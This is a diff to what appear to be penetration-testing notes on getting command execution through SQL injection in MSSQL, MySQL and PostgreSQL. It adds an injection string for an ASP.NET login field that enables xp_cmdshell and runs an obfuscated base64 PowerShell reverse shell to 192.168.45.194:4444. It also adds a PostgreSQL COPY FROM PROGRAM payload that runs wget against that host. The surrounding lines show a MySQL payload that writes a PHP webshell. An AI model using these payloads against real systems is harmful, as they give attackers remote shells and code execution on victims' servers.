@@ -78,7 +78,7 @@ From this point, the `xp_cmdshell` command is unlocked and can be used to get RC
 ##### RCE with credentials
 ```
 impacket-mssqlclient USERNAME:PASSWORD@IP_ADDRESS -windows-auth
-// MSSQL
+// MSSQL, find a way to run these:
 EXECUTE sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1;
@@ -101,6 +101,12 @@ SQL> EXECUTE xp_cmdshell 'whoami';
 
 ```
 
+##### example SQLI
+```
+// All the steps concentrated into one vulnerable MSSQL parameter with a leading '.
+ctl00%24ContentPlaceHolder1%24UsernameTextBox='EXECUTE%20sp_configure%20'show%20advanced%20options',%201;RECONFIGURE;EXECUTE%20sp_configure%20'xp_cmdshell',%201;RECONFIGURE;EXECUTE%20xp_cmdshell%20'powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQA0ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';--
+```
+Note: when trying the individual commands each (non-concentrated), the output did not show any signs of compromise.
 
 #### MySQL Code Execution
 MySQL doesn't have any direct functions for running commands, but the `SELECT INTO_OUTFILE` functionality can be abused.
@@ -111,3 +117,9 @@ Example payload (might produce an error due to the return type, won't affect the
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- -
 ```
 This will write `<?php system($_GET['cmd']);>` into `/var/www/html/tmp/webshell.php`. 
+
+
+#### PostgreSQL Code Execution
+```
+';DROP+TABLE+IF+EXISTS+cmd_exec%3b+CREATE+TABLE+cmd_exec(cmd_output+text)%3b+COPY+cmd_exec+FROM+PROGRAM+'wget+http://192.168.45.194/test'+--
+```
